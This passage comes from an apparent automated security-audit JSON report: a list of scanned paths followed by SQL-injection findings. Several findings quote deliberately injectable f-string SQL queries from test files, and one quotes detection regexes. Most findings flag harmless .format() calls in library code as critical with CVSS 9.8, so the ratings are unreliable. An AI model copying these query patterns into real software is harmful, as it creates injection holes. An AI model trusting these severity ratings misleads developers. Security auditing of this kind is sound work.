          "src/mcp/storage/s3_server.py",
          "code-base-crawler/parallel_development_orchestrator.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/pyopenssl.py",
          "test_env/lib/python3.12/site-packages/httpx/_client.py",
          "code-base-crawler/code-base-crawler/monitoring/docker-compose.monitoring-full.yml",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/_lib/_tmpdirs.py",
          "containers/development/docker-compose.dev.yml",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/util/ssl_.py",
          "test_env/lib/python3.12/site-packages/tortoise/contrib/test/__init__.py",
          "tests/e2e/test_real_world_scenarios.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/rich/prompt.py",
          "deploy_parallel_10_agents.py",
          "test_env/lib/python3.12/site-packages/twisted/words/test/test_jabberclient.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/requests/adapters.py",
          "monitoring/production/grafana-stack.yaml",
          "test_env/lib/python3.12/site-packages/twisted/mail/smtp.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/distlib/index.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/securetransport.py",
          "test_env/lib/python3.12/site-packages/twisted/protocols/sip.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/_securetransport/low_level.py",
          "src/monitoring/prometheus.yml",
          "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
          "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/xmlstream.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/_securetransport/low_level.py",
          "test_env/lib/python3.12/site-packages/twisted/mail/protocols.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
          "test_env/lib/python3.12/site-packages/hyperlink/_url.py",
          "test_env/lib/python3.12/site-packages/twisted/spread/pb.py",
          "src/security/mcp_security_core.py",
          "mcp_learning_system/bandit_security_report.json",
          "test_env/lib/python3.12/site-packages/twisted/mail/test/test_smtp.py",
          "test_env/lib/python3.12/site-packages/twisted/words/im/ircsupport.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connection.py",
          "k8s/mcp-deployment.yaml",
          "test_env/lib/python3.12/site-packages/twisted/words/service.py",
          "test_env/lib/python3.12/site-packages/aiohttp/client_reqrep.py",
          "test_rbac_direct.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/distlib/util.py",
          "containers/development/docker-compose.mcp.yml",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/special/_precompute/wright_bessel_data.py",
          "test_env/lib/python3.12/site-packages/twisted/web/xmlrpc.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/scripts/tkconch.py",
          "code-base-crawler/code-base-crawler/cbc_security/error_sanitizer.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/truststore/_api.py",
          "test_env/lib/python3.12/site-packages/websockets/headers.py",
          "test_env/lib/python3.12/site-packages/rich/console.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/rich/console.py",
          "test_env/lib/python3.12/site-packages/twisted/python/fakepwd.py",
          "test_env/lib/python3.12/site-packages/twisted/mail/test/test_imap.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/util/ssl_.py",
          "infrastructure/logging/docker-compose.logging.yml",
          "backup_agent3_20250607_010225/src/mcp/storage/cloud_storage_server.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/engine/url.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/mssql/pyodbc.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/mysql/mysqldb.py",
          "test_env/lib/python3.12/site-packages/twisted/mail/_pop3client.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/rich/console.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/rich/console.py",
          "test_env/lib/python3.12/site-packages/twisted/plugins/cred_unix.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/test/keydata.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connectionpool.py",
          "test_env/lib/python3.12/site-packages/twisted/protocols/ftp.py",
          "full_stack_review.py",
          "code-base-crawler/code-base-crawler/docker-compose.yml",
          "code-base-crawler/code-base-crawler/run_enhanced_security_audit.py",
          "test_env/lib/python3.12/site-packages/twisted/words/im/basesupport.py",
          "tests/security/comprehensive_security_tests.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/random/tests/test_direct.py",
          "code-base-crawler/code-base-crawler/run_security_audit.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/socks.py",
          "bandit_comprehensive_report.json",
          "test_env/lib/python3.12/site-packages/starlette/datastructures.py",
          "test_env/lib/python3.12/site-packages/yarl/_url.py",
          "test_env/lib/python3.12/site-packages/httpx/_auth.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connection.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/endpoints.py",
          "test_env/lib/python3.12/site-packages/twisted/words/test/test_service.py",
          "test_env/lib/python3.12/site-packages/emails/backend/smtp/client.py",
          "test_env/lib/python3.12/site-packages/twisted/web/http.py",
          "test_mcp_servers_simplified.py",
          "test_env/lib/python3.12/site-packages/tortoise/backends/mssql/client.py",
          "test_env/lib/python3.12/site-packages/tortoise/contrib/starlette/__init__.py",
          "test_env/lib/python3.12/site-packages/urllib3/contrib/pyopenssl.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/vcs/subversion.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/special/_precompute/gammainc_data.py",
          "docker-compose.mcp-production.yml",
          "test_env/lib/python3.12/site-packages/twisted/web/test/test_xmlrpc.py",
          "test_env/lib/python3.12/site-packages/yarl/_parse.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/distlib/util.py",
          "test_env/lib/python3.12/site-packages/twisted/cred/test/test_simpleauth.py",
          "test_environments/scaling/providers/aws_scaler.py",
          "code-base-crawler/code-base-crawler/enhanced_security_audit_results_20250608_101718.json",
          "test_env/lib/python3.12/site-packages/twisted/conch/test/test_checkers.py",
          "src/utils/integration.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/socks.py",
          "test_env/lib/python3.12/site-packages/prometheus_client/exposition.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/testing/plugin/plugin_base.py",
          "test_env/lib/python3.12/site-packages/twisted/cred/test/test_strcred.py",
          "test_env/lib/python3.12/site-packages/tortoise/backends/base/config_generator.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
          "test_env/lib/python3.12/site-packages/twisted/mail/test/test_pop3.py",
          "test_env/lib/python3.12/site-packages/twisted/words/test/test_jabbersasl.py",
          "code-base-crawler/code-base-crawler/deploy/kubernetes/staging/deployment.yaml",
          "test_mcp_security_comprehensive.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connectionpool.py",
          "test_env/lib/python3.12/site-packages/urllib3/util/ssl_.py",
          "containers/production/docker-compose.prod.yml",
          "test_env/lib/python3.12/site-packages/httpx/_main.py",
          "test_env/lib/python3.12/site-packages/twisted/words/test/test_irc.py",
          "test_rbac_standalone.py",
          "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/socks.py",
          "test_env/lib/python3.12/site-packages/uvicorn/main.py"
        ]
      },
      "sql_injection_scan": {
        "status": "completed",
        "vulnerabilities_found": 283,
        "critical_sql_injections": 283,
        "findings": [
          {
            "file": "agent4_comprehensive_security_audit.py",
            "line": 339,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "r'(?i)\\.format\\s*\\(',  # .format() method in SQL context",
            "context": "                r'(?i)cursor\\.execute\\s*\\(\\s*[\"\\'].*\\+.*[\"\\']',  # String concatenation\n                r'(?i)f[\"\\']\\s*SELECT.*{.*}.*[\"\\']',  # F-string in SQL\n                r'(?i)\\.format\\s*\\(',  # .format() method in SQL context\n                r'(?i)%\\s*[\"\\'].*SELECT.*INSERT.*UPDATE.*DELETE',  # String interpolation\n            ]",
            "cvss_score": 9.8
          },
          {
            "file": "test_comprehensive_security_audit.py",
            "line": 118,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "result = await execute_raw_sql(f\"SELECT * FROM users WHERE name = '{payload}'\")",
            "context": "                try:\n                    # Attempt SQL injection\n                    result = await execute_raw_sql(f\"SELECT * FROM users WHERE name = '{payload}'\")\n                    if result:\n                        self.add_vulnerability(",
            "cvss_score": 9.8
          },
          {
            "file": "test_security_mcp_servers_comprehensive.py",
            "line": 126,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "cursor.execute(f\"SELECT * FROM products WHERE name LIKE '%{query}%'\")",
            "context": "                    def search():\n                        query = request.args.get('q')\n                        cursor.execute(f\"SELECT * FROM products WHERE name LIKE '%{query}%'\")\n                    \n                    # Command injection",
            "cvss_score": 9.8
          },
          {
            "file": "test_security_mcp_servers_comprehensive.py",
            "line": 853,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "query = f\"SELECT * FROM users WHERE id = {{user_input}}\"",
            "context": "def vulnerable_func_{i}(user_input):\n    # SQL injection\n    query = f\"SELECT * FROM users WHERE id = {{user_input}}\"\n    cursor.execute(query)\n    ",
            "cvss_score": 9.8
          },
          {
            "file": "benchmarks/dashboard_server.py",
            "line": 170,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "'''.format(days)",
            "context": "                FROM benchmark_results \n                WHERE timestamp > datetime('now', '-{} days')\n            '''.format(days)\n            \n            if test_name:",
            "cvss_score": 9.8
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/typing_extensions.py",
            "line": 1990,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "query(f\"SELECT * FROM {input()}\")  # not ok",
            "context": "\n          query(\"SELECT * FROM table\")  # ok\n          query(f\"SELECT * FROM {input()}\")  # not ok\n\n        See PEP 675 for details.",
            "cvss_score": 9.8
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/req/req_file.py",
            "line": 181,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "line_comes_from = \"{} {} (line {})\".format(",
            "context": ") -> ParsedRequirement:\n    # preserve for the nested code path\n    line_comes_from = \"{} {} (line {})\".format(\n        \"-c\" if line.constraint else \"-r\",\n        line.filename,",
            "cvss_score": 9.8
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/models/search_scope.py",
            "line": 106,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"Looking in links: {}\".format(",
            "context": "        if self.find_links:\n            lines.append(\n                \"Looking in links: {}\".format(\n                    \", \".join(redact_auth_from_url(url) for url in self.find_links)\n                )",
            "cvss_score": 9.8
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/resolution/resolvelib/candidates.py",
            "line": 194,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "return \"{} {} (from {})\".format(",
            "context": "\n    def format_for_error(self) -> str:\n        return \"{} {} (from {})\".format(\n            self.name,\n            self.version,",
            "cvss_score": 9.8
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/idna/core.py",
            "line": 68,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise IDNABidiError('Unknown directionality in label {} at position {}'.format(repr(label), idx))",
            "context": "        if direction == '':\n            # String likely comes from a newer version of Unicode\n            raise IDNABidiError('Unknown directionality in label {} at position {}'.format(repr(label), idx))\n        if direction in ['R', 'AL', 'AN']:\n            bidi_label = True",
            "cvss_score": 9.8
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/urllib3/fields.py",
            "line": 75,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "six.unichr(cc): u\"%{:02X}\".format(cc)",
            "context": "_HTML5_REPLACEMENTS.update(\n    {\n        six.unichr(cc): u\"%{:02X}\".format(cc)\n        for cc in range(0x00, 0x1F + 1)\n        if cc not in (0x1B,)",
            "cvss_score": 9.8
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/packaging/tags.py",
            "line": 163,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"cp{version}{debug}{pymalloc}{ucs4}\".format(",
            "context": "    abis.insert(\n        0,\n        \"cp{version}{debug}{pymalloc}{ucs4}\".format(\n            version=version, debug=debug, pymalloc=pymalloc, ucs4=ucs4\n        ),",
            "cvss_score": 9.8
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/rich/progress.py",
            "line": 624,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "_text = self.text_format.format(task=task)",
            "context": "\n    def render(self, task: \"Task\") -> Text:\n        _text = self.text_format.format(task=task)\n        if self.markup:\n            text = Text.from_markup(_text, style=self.style, justify=self.justify)",
            "cvss_score": 9.8
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/rich/progress.py",
            "line": 751,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "_text = text_format.format(task=task)",
            "context": "            self.text_format_no_percentage if task.total is None else self.text_format\n        )\n        _text = text_format.format(task=task)\n        if self.markup:\n            text = Text.from_markup(_text, style=self.style, justify=self.justify)",
            "cvss_score": 9.8
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/__init__.py",
            "line": 833,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise RuntimeError(msg.format(__file__)) from None",
            "context": "                   \"package managers (pip, conda, apt, ...). Search closed \"\n                   \"numpy issues for similar problems.\")\n            raise RuntimeError(msg.format(__file__)) from None\n\n    _sanity_check()",
            "cvss_score": 9.8
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/_format_impl.py",
            "line": 666,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise ValueError(msg.format(header)) from e2",
            "context": "            except SyntaxError as e2:\n                msg = \"Cannot parse header: {!r}\"\n                raise ValueError(msg.format(header)) from e2\n            else:\n                warnings.warn(",
            "cvss_score": 9.8
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/_format_impl.py",
            "line": 675,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise ValueError(msg.format(header)) from e",
            "context": "        else:\n            msg = \"Cannot parse header: {!r}\"\n            raise ValueError(msg.format(header)) from e\n    if not isinstance(d, dict):\n        msg = \"Header is not a dictionary: {!r}\"",
            "cvss_score": 9.8
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/_format_impl.py",
            "line": 697,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise ValueError(msg.format(d['descr'])) from e",
            "context": "    except TypeError as e:\n        msg = \"descr is not a valid dtype descriptor: {!r}\"\n        raise ValueError(msg.format(d['descr'])) from e\n\n    return d['shape'], d['fortran_order'], dtype",
            "cvss_score": 9.8
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/_arraysetops_impl.py",
            "line": 331,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise TypeError(msg.format(dt=ar.dtype)) from e",
            "context": "        # There's no good way to do this for object arrays, etc...\n        msg = 'The axis argument to unique is not supported for dtype {dt}'\n        raise TypeError(msg.format(dt=ar.dtype)) from e\n\n    def reshape_uniq(uniq):",
            "cvss_score": 9.8
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/__init__.py",
            "line": 68,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise ImportError(msg.format(path))",
            "context": "        \"numpy in {}. One method of fixing this is to repeatedly uninstall \"\n        \"numpy until none is found, then reinstall this version.\")\n    raise ImportError(msg.format(path))\n\nfrom . import numerictypes as nt",
            "cvss_score": 9.8
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/tests/test_kind.py",
            "line": 28,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "), f\"selectedintkind({i}): expected {selected_int_kind(i)!r} but got {selectedintkind(i)!r}\"",
            "context": "            assert selectedintkind(i) == selected_int_kind(\n                i\n            ), f\"selectedintkind({i}): expected {selected_int_kind(i)!r} but got {selectedintkind(i)!r}\"\n\n    def test_real(self):",
            "cvss_score": 9.8
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/tests/test_kind.py",
            "line": 40,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "), f\"selectedrealkind({i}): expected {selected_real_kind(i)!r} but got {selectedrealkind(i)!r}\"",
            "context": "            assert selectedrealkind(i) == selected_real_kind(\n                i\n            ), f\"selectedrealkind({i}): expected {selected_real_kind(i)!r} but got {selectedrealkind(i)!r}\"\n\n    @pytest.mark.xfail(platform.machine().lower().startswith(\"ppc\"),",
            "cvss_score": 9.8
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/tests/test_kind.py",
            "line": 53,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "), f\"selectedrealkind({i}): expected {selected_real_kind(i)!r} but got {selectedrealkind(i)!r}\"",
            "context": "            assert selectedrealkind(i) == selected_real_kind(\n                i\n            ), f\"selectedrealkind({i}): expected {selected_real_kind(i)!r} but got {selectedrealkind(i)!r}\"\n",
            "cvss_score": 9.8
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/typing_extensions.py",
            "line": 1990,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "query(f\"SELECT * FROM {input()}\")  # not ok",
            "context": "\n          query(\"SELECT * FROM table\")  # ok\n          query(f\"SELECT * FROM {input()}\")  # not ok\n\n        See PEP 675 for details.",
            "cvss_score": 9.8
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/req/req_file.py",
            "line": 181,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "line_comes_from = \"{} {} (line {})\".format(",
            "context": ") -> ParsedRequirement:\n    # preserve for the nested code path\n    line_comes_from = \"{} {} (line {})\".format(\n        \"-c\" if line.constraint else \"-r\",\n        line.filename,",
            "cvss_score": 9.8
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/models/search_scope.py",
            "line": 106,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"Looking in links: {}\".format(",
            "context": "        if self.find_links:\n            lines.append(\n                \"Looking in links: {}\".format(\n                    \", \".join(redact_auth_from_url(url) for url in self.find_links)\n                )",
            "cvss_score": 9.8
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/resolution/resolvelib/candidates.py",
            "line": 194,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "return \"{} {} (from {})\".format(",
            "context": "\n    def format_for_error(self) -> str:\n        return \"{} {} (from {})\".format(\n            self.name,\n            self.version,",
            "cvss_score": 9.8
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/idna/core.py",
            "line": 68,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise IDNABidiError('Unknown directionality in label {} at position {}'.format(repr(label), idx))",
            "context": "        if direction == '':\n            # String likely comes from a newer version of Unicode\n            raise IDNABidiError('Unknown directionality in label {} at position {}'.format(repr(label), idx))\n        if direction in ['R', 'AL', 'AN']:\n            bidi_label = True",
            "cvss_score": 9.8
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/fields.py",
            "line": 75,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "six.unichr(cc): u\"%{:02X}\".format(cc)",
            "context": "_HTML5_REPLACEMENTS.update(\n    {\n        six.unichr(cc): u\"%{:02X}\".format(cc)\n        for cc in range(0x00, 0x1F + 1)\n        if cc not in (0x1B,)",
            "cvss_score": 9.8
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/packaging/tags.py",
            "line": 163,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"cp{version}{debug}{pymalloc}{ucs4}\".format(",
            "context": "    abis.insert(\n        0,\n        \"cp{version}{debug}{pymalloc}{ucs4}\".format(\n            version=version, debug=debug, pymalloc=pymalloc, ucs4=ucs4\n        ),",
            "cvss_score": 9.8
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/rich/progress.py",
            "line": 624,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "_text = self.text_format.format(task=task)",
            "context": "\n    def render(self, task: \"Task\") -> Text:\n        _text = self.text_format.format(task=task)\n        if self.markup:\n            text = Text.from_markup(_text, style=self.style, justify=self.justify)",
            "cvss_score": 9.8
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/rich/progress.py",
            "line": 751,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "_text = text_format.format(task=task)",
            "context": "            self.text_format_no_percentage if task.total is None else self.text_format\n        )\n        _text = text_format.format(task=task)\n        if self.markup:\n            text = Text.from_markup(_text, style=self.style, justify=self.justify)",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/typing_extensions.py",
            "line": 2263,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "query(f\"SELECT * FROM {input()}\")  # not ok",
            "context": "\n          query(\"SELECT * FROM table\")  # ok\n          query(f\"SELECT * FROM {input()}\")  # not ok\n\n        See PEP 675 for details.",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pypika_tortoise/terms.py",
            "line": 1043,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "sql = \"{term} FROM {start} TO {end}\".format(",
            "context": "class PeriodCriterion(RangeCriterion):\n    def get_sql(self, ctx: SqlContext) -> str:\n        sql = \"{term} FROM {start} TO {end}\".format(\n            term=self.term.get_sql(ctx),\n            start=self.start.get_sql(ctx),",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pypika_tortoise/functions.py",
            "line": 301,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "return \"FROM {field}\".format(field=self.field.get_sql(ctx))",
            "context": "\n    def get_special_params_sql(self, ctx: SqlContext) -> str:\n        return \"FROM {field}\".format(field=self.field.get_sql(ctx))\n\n",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pypika_tortoise/queries.py",
            "line": 614,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"\\n\\nMain Query:\\n{query1}\\n\\nSet Operations Query:\\n{query2}\".format(",
            "context": "                raise SetOperationException(\n                    \"Queries must have an equal number of select statements in a set operation.\"\n                    \"\\n\\nMain Query:\\n{query1}\\n\\nSet Operations Query:\\n{query2}\".format(\n                        query1=base_querystring, query2=set_operation_querystring\n                    )",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pypika_tortoise/queries.py",
            "line": 824,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "conflict_query += \" WHERE {where}\".format(",
            "context": "        if self._on_conflict_wheres:\n            where_ctx = ctx.copy(subquery=True)\n            conflict_query += \" WHERE {where}\".format(\n                where=self._on_conflict_wheres.get_sql(where_ctx)\n            )",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pypika_tortoise/queries.py",
            "line": 840,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"{field}={value}\".format(",
            "context": "                if value:\n                    updates.append(\n                        \"{field}={value}\".format(\n                            field=field.get_sql(ctx), value=value.get_sql(value_ctx)\n                        )",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pypika_tortoise/queries.py",
            "line": 846,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"{field}=EXCLUDED.{value}\".format(",
            "context": "                else:\n                    updates.append(\n                        \"{field}=EXCLUDED.{value}\".format(\n                            field=field.get_sql(ctx),\n                            value=field.get_sql(ctx),",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pypika_tortoise/queries.py",
            "line": 851,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "action_sql = \" DO UPDATE SET {updates}\".format(updates=\",\".join(updates))  # nosec:B608",
            "context": "                        )\n                    )\n            action_sql = \" DO UPDATE SET {updates}\".format(updates=\",\".join(updates))  # nosec:B608\n\n            if self._on_conflict_do_update_wheres:",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pypika_tortoise/queries.py",
            "line": 854,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "action_sql += \" WHERE {where}\".format(",
            "context": "\n            if self._on_conflict_do_update_wheres:\n                action_sql += \" WHERE {where}\".format(\n                    where=self._on_conflict_do_update_wheres.get_sql(\n                        ctx.copy(subquery=True, with_namespace=True)",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pypika_tortoise/queries.py",
            "line": 1584,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "return \"SELECT {distinct}{select}\".format(",
            "context": "    def _select_sql(self, ctx: SqlContext) -> str:\n        select_ctx = ctx.copy(subquery=True, with_alias=True)\n        return \"SELECT {distinct}{select}\".format(\n            distinct=self._distinct_sql(ctx),\n            select=\",\".join(term.get_sql(select_ctx) for term in self._selects),",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pypika_tortoise/queries.py",
            "line": 1611,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "return \" ({columns})\".format(columns=\",\".join(term.get_sql(ctx) for term in self._columns))",
            "context": "        # Remove from ctx, never format the column terms with namespaces since only one table can be inserted into\n        ctx = ctx.copy(with_namespace=False)\n        return \" ({columns})\".format(columns=\",\".join(term.get_sql(ctx) for term in self._columns))\n\n    def _values_sql(self, ctx: SqlContext) -> str:",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pypika_tortoise/queries.py",
            "line": 1623,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "return \" INTO {table}\".format(",
            "context": "    def _into_sql(self, ctx: SqlContext) -> str:\n        into_ctx = ctx.copy(with_alias=False)\n        return \" INTO {table}\".format(\n            table=self._insert_table.get_sql(into_ctx),  # type:ignore[union-attr]\n        )",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pypika_tortoise/queries.py",
            "line": 1629,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "return \" FROM {selectable}\".format(",
            "context": "    def _from_sql(self, ctx: SqlContext) -> str:\n        from_ctx = ctx.copy(subquery=True, with_alias=True)\n        return \" FROM {selectable}\".format(\n            selectable=\",\".join(clause.get_sql(from_ctx) for clause in self._from)\n        )",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pypika_tortoise/queries.py",
            "line": 1646,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "return \" PREWHERE {prewhere}\".format(prewhere=prewheres.get_sql(prewhere_sql))",
